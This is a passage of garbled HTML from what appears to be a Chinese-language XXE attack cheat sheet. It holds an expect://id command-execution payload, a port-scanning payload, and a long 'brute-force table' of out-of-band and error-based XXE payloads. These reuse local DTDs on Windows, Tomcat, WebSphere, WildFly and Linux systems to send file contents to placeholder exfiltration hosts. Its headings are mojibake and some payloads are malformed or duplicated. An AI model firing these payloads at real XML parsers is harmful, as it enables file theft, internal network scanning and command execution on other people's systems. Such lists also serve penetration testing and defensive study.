class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;â€1.0â€³ encoding&#x3D;â€utf-8â€³?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><h2 id="4-ç«¯å£æ‰«æï¼š"><a href="#4-ç«¯å£æ‰«æï¼š" class="headerlink" title="4. ç«¯å£æ‰«æï¼š"></a>4. ç«¯å£æ‰«æï¼š</h2><p>ç«¯å£å¼€æ”¾æ—¶ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œç«¯å£ä¸å­˜åœ¨æ—¶ä¼šæ— æ³•è¿æ¥<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;â€1.0â€³ encoding&#x3D;â€utf-8â€³?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;http:&#x2F;ip:port&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;&#x2F;name</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬äº”é˜¶æ®µï¼ˆxxeçˆ†ç ´è¡¨ï¼‰"><a href="#ç¬¬äº”é˜¶æ®µï¼ˆxxeçˆ†ç ´è¡¨ï¼‰" class="headerlink" title="ç¬¬äº”é˜¶æ®µï¼ˆxxeçˆ†ç ´è¡¨ï¼‰"></a>ç¬¬äº”é˜¶æ®µï¼ˆxxeçˆ†ç ´è¡¨ï¼‰</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x SYSTEM &quot;http:&#x2F;&#x2F;xxe-doctype-system.yourdomain[.]com&#x2F;&quot;&gt;&lt;x &#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;xxe-doctype-public.yourdomain[.]com&#x2F;&quot;&gt;&lt;x &#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe-entity-system.yourdomain[.]com&#x2F;&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;xxe-entity-public.yourdomain[.]com&#x2F;&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe-paramentity-system.yourdomain[.]com&#x2F;&quot;&gt;%xxe;]&gt;&lt;x&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY % xxe PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;xxe-paramentity-public.yourdomain[.]com&#x2F;&quot;&gt;%xxe;]&gt;&lt;x&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;x xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsi-schemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;x xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:noNamespaceSchemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsi-nonamespaceschemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:include schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsinclude-schemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:include namespace&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsinclude-namespace.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:import schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsimport-schemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:import namespace&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsimport-namespace.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml-stylesheet href&#x3D;&quot;http:&#x2F;&#x2F;xxe-xml-stylesheet.yourdomain[.]com&#x2F;&quot;?&gt;&lt;x &#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-1.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\wmi20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-2.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Program Files (x86)\Lotus\Notes\domino.dtd&quot;&gt;&lt;!ENTITY % boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-3.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\xwizard.dtd&quot;&gt;&lt;!ENTITY % onerrortypes &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-4.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-5.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;&lt;!ENTITY % URI &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-6.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;tomcat-coyote.jar!&#x2F;org&#x2F;apache&#x2F;tomcat&#x2F;util&#x2F;modeler&#x2F;mbeans-descriptors.dtd&quot;&gt; &lt;!ENTITY % Boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-7.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt; &lt;!ENTITY % url.attribute.set &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-8.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt; &lt;!ENTITY % url.attribute.set &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-8.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;opt&#x2F;IBM&#x2F;WebSphere&#x2F;AppServer&#x2F;properties&#x2F;sip-app_1_0.dtd&quot;&gt; &lt;!ENTITY % condition &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-9.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd&quot;&gt; &lt;!ENTITY % constant &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-10.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;struts&#x2F;struts-config_1_1.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-11.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;u01&#x2F;oracle&#x2F;wlserver&#x2F;server&#x2F;lib&#x2F;consoleapp&#x2F;webapp&#x2F;WEB-INF&#x2F;struts-config_1_2.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-12.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;gtksourceview-4&#x2F;language-specs&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % itemattrs &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-13.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib&#x2F;gap&#x2F;pkg&#x2F;GAPDoc-1.6.2&#x2F;bibxmlext.dtd&quot;&gt; &lt;!ENTITY % n.InProceedings &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-14.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;boostbook&#x2F;dtd&#x2F;boostbook.dtd&quot;&gt; &lt;!ENTITY % boost.common.attrib &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-15.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;main&#x2F;lucene-queryparser-5.5.5.jar!&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;queryparser&#x2F;xml&#x2F;LuceneCoreQuery.dtd&quot;&gt; &lt;!ENTITY % queries &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-16.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;xml-resolver&#x2F;main&#x2F;xml-resolver-1.2.jar!&#x2F;org&#x2F;apache&#x2F;xml&#x2F;resolver&#x2F;etc&#x2F;catalog.dtd&quot;&gt; &lt;!ENTITY % publicIdentifier &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-17.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nmap.dtd&quot;&gt; &lt;!ENTITY % attr_numeric &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-18.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;liteide&#x2F;liteeditor&#x2F;kate&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % commonAttributes &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-19.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; 